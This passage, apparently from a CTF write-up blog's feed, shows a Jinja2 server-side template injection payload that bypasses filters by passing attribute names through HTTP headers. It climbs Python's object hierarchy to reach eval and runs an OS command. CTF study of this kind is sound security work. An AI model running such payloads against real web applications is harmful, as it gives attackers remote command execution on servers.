-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>
-
-]]></content>
   </entry>
   <entry>
     <title>全国工控2020-web-easyphp</title>
